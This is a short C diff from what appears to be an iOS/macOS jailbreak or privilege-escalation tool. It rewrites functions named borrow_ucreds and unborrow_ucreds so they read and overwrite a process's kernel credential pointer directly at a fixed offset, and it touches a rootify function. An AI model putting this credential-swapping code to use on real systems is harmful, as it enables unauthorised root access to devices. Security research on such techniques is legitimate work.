@@ -10,7 +10,6 @@
 #include "offsets.h"
 #include "proc.h"
 #include "escalate.h"
-#include "stage2.h"
 
 
 extern char **environ;
@@ -45,8 +44,8 @@ uint64_t borrow_ucreds(pid_t to_pid, pid_t from_pid) {
     uint64_t to_proc = proc_of_pid(to_pid);
     uint64_t from_proc = proc_of_pid(from_pid);
     
-    uint64_t to_ucred = get_ucred(to_proc);
-    uint64_t from_ucred = get_ucred(from_proc);
+    uint64_t to_ucred = kread64(to_proc + off_p_ucred);
+    uint64_t from_ucred = kread64(from_proc + off_p_ucred);
     
     kwrite64(to_proc + off_p_ucred, from_ucred);
     
@@ -56,7 +55,7 @@ uint64_t borrow_ucreds(pid_t to_pid, pid_t from_pid) {
 void unborrow_ucreds(pid_t to_pid, uint64_t to_ucred) {
     uint64_t to_proc = proc_of_pid(to_pid);
     
-    kwrite64(get_ucred(to_proc), to_ucred);
+    kwrite64(to_proc + off_p_ucred, to_ucred);
 }
 
 bool rootify(pid_t pid) {
